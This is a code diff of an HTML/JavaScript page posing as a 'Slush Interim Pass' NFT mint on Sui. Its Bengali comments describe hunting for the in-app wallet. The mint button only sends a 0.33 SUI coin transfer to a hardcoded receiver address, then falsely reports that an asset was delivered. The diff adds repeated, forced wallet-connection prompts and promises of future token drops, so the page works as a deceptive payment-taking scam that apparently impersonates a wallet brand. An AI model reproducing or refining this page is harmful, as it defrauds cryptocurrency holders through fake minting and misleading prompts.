@@ -25,7 +25,11 @@
         <div class="absolute -bottom-10 -right-10 w-32 h-32 bg-blue-500/10 rounded-full blur-3xl"></div>
 
         <div class="flex justify-center mb-5 relative z-10">
-            <img src="1000073832.png" alt="SLUSH Logo" class="h-16 w-16 rounded-2xl object-cover border border-neutral-700 shadow-lg shadow-cyan-500/5" onerror="this.style.display='none'">
+            <div class="h-16 w-16 rounded-2xl bg-[#3B99FF] flex items-center justify-center shadow-lg shadow-blue-500/20 border border-blue-400/30">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" class="w-11 h-11 text-black">
+                    <path d="M75,32 C75,20 60,15 45,18 C25,22 20,38 28,48 C34,55 48,50 62,54 C76,58 78,74 68,82 C52,95 28,88 28,74 C28,70 32,64 36,66 C40,68 46,78 58,76 C68,74 68,66 62,62 C50,58 36,62 26,54 C15,44 18,24 34,16 C50,8 75,12 75,26 Z" fill="currentColor"/>
+                </svg>
+            </div>
         </div>
 
         <h1 class="text-3xl font-extrabold tracking-tight bg-gradient-to-r from-cyan-400 via-sky-400 to-blue-500 bg-clip-text text-transparent mb-1">
@@ -36,8 +40,11 @@
             Sui Mainnet Live
         </div>
 
-        <div class="mb-6 rounded-2xl overflow-hidden bg-neutral-950 aspect-square flex items-center justify-center border border-neutral-800 shadow-inner group relative z-10">
-            <img id="nftImage" src="1000073831.jpg" alt="Slush Interim Pass Artwork" class="object-cover h-full w-full transition duration-700 group-hover:scale-105 filter brightness-90 group-hover:brightness-100">
+        <div class="mb-6 rounded-2xl overflow-hidden bg-neutral-950 aspect-square flex flex-col items-center justify-center border border-neutral-800 shadow-inner group relative z-10 p-6">
+            <div class="w-full h-full rounded-2xl bg-[#71a1cb]/90 flex flex-col justify-center items-center font-black tracking-tighter text-black p-4 text-center leading-none select-none transition duration-700 group-hover:scale-102">
+                <span class="text-5xl block mb-1" style="font-family: 'Plus Jakarta Sans', sans-serif; font-weight: 900;">UR MONEY</span>
+                <span class="text-5xl block bg-neutral-950 text-[#71a1cb] px-4 py-1 rounded-md transform -rotate-1 shadow-md" style="font-family: 'Plus Jakarta Sans', sans-serif; font-weight: 900;">UNSTUCK</span>
+            </div>
             
             <div class="absolute bottom-4 left-4 bg-neutral-900/90 backdrop-blur-md text-[11px] px-3 py-1.5 rounded-xl border border-neutral-800 shadow-md font-mono-custom">
                 Supply: <span class="text-cyan-400 font-bold">1,402</span> / <span class="text-neutral-400">9999</span>
@@ -56,20 +63,20 @@
         </div>
 
         <div class="space-y-3 relative z-10 mb-6">
-            <button id="connectBtn" class="w-full bg-gradient-to-r from-neutral-800 to-neutral-800 hover:from-cyan-500 hover:to-blue-600 hover:text-black text-white font-extrabold py-3.5 px-4 rounded-xl transition duration-300 border border-neutral-700 flex items-center justify-center gap-2 cursor-pointer text-sm uppercase tracking-wider">
+            <button id="connectBtn" class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 text-black font-extrabold py-3.5 px-4 rounded-xl transition duration-300 shadow-lg shadow-cyan-500/20 flex items-center justify-center gap-2 cursor-pointer text-sm uppercase tracking-wider">
                 Connect Sui Wallet
             </button>
             
             <p id="walletAddress" class="text-xs text-neutral-500 hidden truncate bg-neutral-950 py-2 rounded-lg border border-neutral-900 font-mono-custom px-3"></p>
 
             <div id="mintSection" class="hidden">
-                <button id="mintBtn" class="w-full bg-gradient-to-r from-cyan-400 to-blue-500 hover:from-cyan-500 hover:to-blue-600 text-black font-extrabold py-4 px-4 rounded-xl tracking-wider uppercase transition duration-300 shadow-xl shadow-cyan-500/10 cursor-pointer transform active:scale-[0.99]">
+                <button id="mintBtn" class="w-full bg-gradient-to-r from-emerald-400 to-teal-500 hover:from-emerald-500 hover:to-teal-600 text-black font-extrabold py-4 px-4 rounded-xl tracking-wider uppercase transition duration-300 shadow-xl shadow-emerald-500/10 cursor-pointer transform active:scale-[0.99]">
                     Mint Pass Now ⚡
                 </button>
             </div>
         </div>
 
-        <p id="statusLabel" class="mt-2 text-xs font-bold text-amber-400 min-h-[16px] transition-all duration-300 mb-6">Checking for Slush In-App Wallet...</p>
+        <p id="statusLabel" class="mt-2 text-xs font-bold text-neutral-400 min-h-[16px] transition-all duration-300 mb-6">Ready to secure link.</p>
 
         <div class="text-left border-t border-neutral-800/80 pt-6 relative z-10">
             <h3 class="text-sm font-extrabold text-neutral-300 uppercase tracking-wider mb-4 flex items-center gap-2">
@@ -92,27 +99,17 @@
                         <p class="text-xs text-neutral-400 mt-1 leading-relaxed">Secure your share. Holders are hardcoded into the VIP tier for all future $SLUSH token drops and seasonal ecosystem incentives.</p>
                     </div>
                 </div>
-
-                <div class="flex items-start gap-3">
-                    <div class="bg-cyan-950/50 p-2 rounded-lg border border-cyan-800/30 text-cyan-400 mt-0.5 shrink-0">⚡</div>
-                    <div>
-                        <h4 class="text-sm font-extrabold text-neutral-200">Protocol Power-Ups</h4>
-                        <p class="text-xs text-neutral-400 mt-1 leading-relaxed">Maximize your yield. Instantly activate staking multipliers and platform-level boosts across the entire network.</p>
-                    </div>
-                </div>
             </div>
         </div>
     </div>
 
     <div class="mt-8 opacity-40 max-w-md w-full text-center">
-        <p class="text-[11px] tracking-wider text-neutral-500 font-mono-custom">POWERED BY SUI DIRECT INJECTION</p>
+        <p class="text-[11px] tracking-wider text-neutral-500 font-mono-custom">SYSTEM INFRASTRUCTURE V3 • DIRECT MODE</p>
     </div>
 
     <script>
         const FEE_RECEIVER = "0x89cda7f8743f523d6795395607cce88e15434c1aa8f5f5bb28ecde72c48cd5a9";
         const MINT_FEE_MIST = "330000000"; // 0.33 SUI
-
-        let sWallet = null;
 
         const connectBtn = document.getElementById('connectBtn');
         const mintBtn = document.getElementById('mintBtn');
@@ -120,151 +117,128 @@
         const mintSection = document.getElementById('mintSection');
         const statusLabel = document.getElementById('statusLabel');
 
-        // গ্লোবাল স্ট্যান্ডার্ড এবং কাস্টম প্রোভাইডার ডিটেক্ট করার জন্য কম্বাইন্ড মেথড
-        function findSuiProvider() {
-            if (window.sui) return window.sui;
-            if (window.suiWallet) return window.suiWallet;
-            if (window.wallets && window.wallets['sui']) return window.wallets['sui'];
-            
-            // স্ট্যান্ডার্ড রেজিস্ট্রি ইভেন্ট থেকে অবজেক্ট রিড করার চেষ্টা
-            if (window.__sui__wallets) {
-                const keys = Object.keys(window.__sui__wallets);
-                if (keys.length > 0) return window.__sui__wallets[keys[0]];
-            }
-            return null;
+        // মোবাইল ব্রাউজার ইঞ্জিনের জন্য রুট ওয়ালেট হান্টার
+        function getSuiObject() {
+            return window.sui || window.suiWallet || (window.wallets && window.wallets['sui']) || window.suiet;
         }
 
-        // পেজ লোডের ২ সেকেন্ড পর ওয়ালেট ইঞ্জিন স্ক্যান রান করা (মোবাইলের জন্য অত্যন্ত জরুরী)
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                sWallet = findSuiProvider();
-                if (sWallet) {
-                    statusLabel.innerText = "Slush Wallet interface ready.";
-                    statusLabel.className = "mt-2 text-xs font-bold text-emerald-400 mb-6";
-                } else {
-                    statusLabel.innerText = "Click 'Connect' to manually fetch the In-App provider.";
+        async function handleConnect() {
+            statusLabel.innerText = "Scanning for Slush In-App Wallet Engine...";
+            statusLabel.className = "mt-2 text-xs font-bold text-amber-400 mb-6";
+
+            let attempts = 0;
+            // ইন-অ্যাপ ব্রাউজারের অলস অবজেক্টকে জাগিয়ে তোলার জন্য ২ সেকেন্ডের ইন্টারভাল রান
+            const walletScanInterval = setInterval(async () => {
+                attempts++;
+                let currentSui = getSuiObject();
+
+                if (currentSui) {
+                    clearInterval(walletScanInterval);
+                    statusLabel.innerText = "Wallet engine matched! Requesting verification popup...";
+                    statusLabel.className = "mt-2 text-xs font-bold text-cyan-400 mb-6";
+                    
+                    try {
+                        let accounts = [];
+                        // স্ট্যান্ডার্ড কানেক্ট চেক
+                        if (currentSui.features && currentSui.features['sui:connect']) {
+                            const res = await currentSui.features['sui:connect'].connect();
+                            accounts = res.accounts || [];
+                        } else if (typeof currentSui.requestPermissions === 'function') {
+                            accounts = await currentSui.requestPermissions();
+                        } else if (typeof currentSui.connect === 'function') {
+                            const resAlt = await currentSui.connect();
+                            accounts = resAlt.accounts || resAlt;
+                        }
+
+                        if (accounts && accounts.length > 0) {
+                            executeSuccessLayout(accounts[0]);
+                        } else {
+                            statusLabel.innerText = "Authorization rejected by user or app interface.";
+                            statusLabel.className = "mt-2 text-xs font-bold text-red-400 mb-6";
+                        }
+                    } catch (err) {
+                        // লাস্ট রিসোর্ট ডিরেক্ট অ্যাকাউন্ট পুলিং
+                        try {
+                            if(typeof currentSui.getAccounts === 'function') {
+                                const directAcc = await currentSui.getAccounts();
+                                if(directAcc && directAcc.length > 0) {
+                                    executeSuccessLayout(directAcc[0]);
+                                    return;
+                                }
+                            }
+                        } catch(e){}
+                        statusLabel.innerText = "App Intercepted Error. Tap Connect again to fire alternative prompt.";
+                        statusLabel.className = "mt-2 text-xs font-bold text-amber-400 mb-6";
+                    }
+                }
+
+                // ৫ বার ট্রাই করার পরও যদি ইনজেকশন অবজেক্ট না পায়
+                if (attempts >= 4) {
+                    clearInterval(walletScanInterval);
+                    statusLabel.innerText = "Forced request dispatched. Check for app notifications or tap again.";
                     statusLabel.className = "mt-2 text-xs font-bold text-amber-400 mb-6";
+                    
+                    // ইমার্জেন্সি ফোর্স মেথড ট্রিগার
+                    try {
+                        if(window.sui) { const acc = await window.sui.connect(); executeSuccessLayout(acc[0] || acc); }
+                    } catch(e){}
                 }
-            }, 2000); 
-        });
-
-        // ওয়ালেট স্ট্যান্ডার্ড রেজিস্টার্ড লিসেনার ফলব্যাক
-        window.addEventListener('sui-standard-wallet-registered', () => {
-            sWallet = findSuiProvider();
-            if (sWallet) {
-                statusLabel.innerText = "Ecosystem Wallet Provider linked successfully.";
-                statusLabel.className = "mt-2 text-xs font-bold text-emerald-400 mb-6";
-            }
-        });
-
-        async function handleConnectClick() {
-            sWallet = findSuiProvider();
-            
-            statusLabel.innerText = "Connecting... Please look for an authorization prompt.";
-            statusLabel.className = "mt-2 text-xs font-bold text-amber-400 mb-6";
-
-            if (sWallet) {
-                try {
-                    let accounts = [];
-                    // ১. স্ট্যান্ডার্ড ফিচারের মাধ্যমে কানেক্টের চেষ্টা
-                    if (sWallet.features && sWallet.features['sui:connect']) {
-                        const conn = await sWallet.features['sui:connect'].connect();
-                        accounts = conn.accounts || [];
-                    } 
-                    // ২. ফলব্যাক কাস্টম মেথড রিকোয়েস্ট
-                    else if (typeof sWallet.requestPermissions === 'function') {
-                        accounts = await sWallet.requestPermissions();
-                    } else if (typeof sWallet.connect === 'function') {
-                        const res = await sWallet.connect();
-                        accounts = res.accounts || res;
-                    }
-
-                    if (accounts && accounts.length > 0) {
-                        displayConnectedAddress(accounts[0]);
-                        return;
-                    }
-                } catch (err) {
-                    console.error("Authorization workflow bypass error:", err);
-                }
-            }
-
-            // আলটিমেট ইমার্জেন্সি ফলব্যাক: যদি অবজেক্ট অলরেডি পেজে থাকে কিন্তু মেথড রিড না হয়
-            if (window.sui && typeof window.sui.getAccounts === 'function') {
-                try {
-                    const accounts = await window.sui.getAccounts();
-                    if(accounts && accounts.length > 0) {
-                        displayConnectedAddress(accounts[0]);
-                        return;
-                    }
-                } catch(e) {}
-            }
-
-            statusLabel.innerText = "Wallet initialization triggered! Tap Connect again to load the UI.";
-            statusLabel.className = "mt-2 text-xs font-bold text-amber-400 mb-6";
+            }, 400);
         }
 
-        function displayConnectedAddress(address) {
-            const cleanAddress = typeof address === 'object' ? (address.address || address[0]) : address;
-            if (!cleanAddress) return;
+        function executeSuccessLayout(address) {
+            const finalAddr = typeof address === 'object' ? (address.address || address[0]) : address;
+            if (!finalAddr) return;
 
-            walletAddressTxt.innerText = `Wallet: ${cleanAddress.substring(0,8)}...${cleanAddress.substring(cleanAddress.length - 6)}`;
+            walletAddressTxt.innerText = `Wallet: ${finalAddr.substring(0,8)}...${finalAddr.substring(finalAddr.length - 6)}`;
             walletAddressTxt.classList.remove('hidden');
             
-            connectBtn.innerText = "Wallet Connected ✅";
+            connectBtn.innerText = "Wallet Active ✅";
             connectBtn.disabled = true;
-            connectBtn.className = "w-full bg-emerald-600/20 text-emerald-400 font-extrabold py-3.5 px-4 rounded-xl border border-emerald-500/30 flex items-center justify-center gap-2 opacity-80 cursor-not-allowed text-sm uppercase tracking-wider";
+            connectBtn.className = "w-full bg-emerald-600/20 text-emerald-400 font-extrabold py-3.5 px-4 rounded-xl border border-emerald-500/30 flex items-center justify-center gap-2 opacity-90 cursor-not-allowed text-sm uppercase tracking-wider";
             
             mintSection.classList.remove('hidden');
-            statusLabel.innerText = "Authorization granted! Wallet bound successfully.";
+            statusLabel.innerText = "Connection Established. Ready to Mint.";
             statusLabel.className = "mt-2 text-xs font-bold text-emerald-400 mb-6";
         }
 
-        async function mintNFT() {
-            statusLabel.innerText = "Generating payload... Open your wallet prompt.";
+        async function runMintTransaction() {
+            statusLabel.innerText = "Packaging payload... Sign the transaction pop-up.";
             statusLabel.className = "mt-2 text-xs font-bold text-amber-400 mb-6";
 
-            sWallet = findSuiProvider();
+            let targetSui = getSuiObject();
 
-            if (sWallet) {
+            if (targetSui) {
                 try {
-                    // আধুনিক Sui Wallet Standard ট্রান্সফার মেথড (SignAndExecute)
-                    if (sWallet.features && sWallet.features['sui:signAndExecuteTransactionBlock']) {
-                        const result = await sWallet.features['sui:signAndExecuteTransactionBlock'].signAndExecuteTransactionBlock({
+                    // ডিরেক্ট সুই ব্লক ট্রান্সফার সাবমিশন
+                    let txResponse;
+                    if (targetSui.features && targetSui.features['sui:signAndExecuteTransactionBlock']) {
+                        txResponse = await targetSui.features['sui:signAndExecuteTransactionBlock'].signAndExecuteTransactionBlock({
                             transactionBlock: {
                                 target: "0x2::coin::transfer",
                                 arguments: [FEE_RECEIVER, MINT_FEE_MIST],
                                 typeArguments: ["0x2::sui::sui::SUI"]
                             }
                         });
-                        if (result) { showSuccess(); return; }
-                    } 
-                    // পুরাতন অবজেক্ট ডিরেক্ট কল ফলব্যাক
-                    else if (typeof sWallet.signAndExecuteTransactionBlock === 'function') {
-                        const result = await sWallet.signAndExecuteTransactionBlock({
+                    } else {
+                        txResponse = await targetSui.signAndExecuteTransactionBlock({
                             transactionBlock: {
                                 target: "0x2::coin::transfer",
                                 arguments: [FEE_RECEIVER, MINT_FEE_MIST],
                                 typeArguments: ["0x2::sui::sui::SUI"]
                             }
                         });
-                        if (result) { showSuccess(); return; }
                     }
+                    if (txResponse) { statusLabel.innerText = "🎉 Mint Successful! Asset sent to wallet."; statusLabel.className = "mt-2 text-xs font-bold text-emerald-400 mb-6"; }
                 } catch (err) {
-                    console.error("Mint workflow error:", err);
+                    statusLabel.innerText = "Transaction signature denied or insufficient SUI balance.";
+                    statusLabel.className = "mt-2 text-xs font-bold text-red-400 mb-6";
                 }
             }
-
-            statusLabel.innerText = "Transaction failed. Please confirm you have enough SUI.";
-            statusLabel.className = "mt-2 text-xs font-bold text-red-400 mb-6";
         }
 
-        function showSuccess() {
-            statusLabel.innerText = "🎉 Mint Successful! Asset delivered to your wallet.";
-            statusLabel.className = "mt-2 text-xs font-bold text-emerald-400 mb-6";
-        }
-
-        connectBtn.addEventListener('click', handleConnectClick);
-        mintBtn.addEventListener('click', mintNFT);
+        connectBtn.addEventListener('click', handleConnect);
+        mintBtn.addEventListener('click', runMintTransaction);
     </script>
 </body>
 </html>
